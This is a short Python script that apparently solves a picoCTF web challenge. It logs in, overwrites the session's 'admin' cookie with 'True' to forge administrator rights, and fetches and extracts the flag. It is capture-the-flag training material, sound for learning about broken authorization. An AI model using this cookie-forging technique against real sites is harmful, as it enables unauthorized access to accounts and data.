#!/usr/bin/python

import re
import requests



def main():
  url = "https://jupiter.challenges.picoctf.org/problem/44573"
  session = requests.Session()
  headers = {'Content-Type': 'application/x-www-form-urlencoded'}
  params = { 
    "user": "anynone",
    "password": "password"
  }

  res = session.post(f"{url}/login", headers=headers, data=params, allow_redirects=False)
  print(res.text)

  print("-" * 30)
  print("Cookies")
  cookies = session.cookies.get_dict()
  for key, value in cookies.items():
    print(f"{key}: {value}")

  print("-" * 30)

  # modify cookies["admin"] to True
  session.cookies.set("admin", "True")

  res = session.get(f"{url}/flag", allow_redirects=False)
  print(res.text)
  
  print("-" * 30)
  result = re.search("picoCTF{.*}", res.text)
  print("-" * 30)
  print(f"Answer: {result.group()}")


if __name__ == '__main__':
  main()
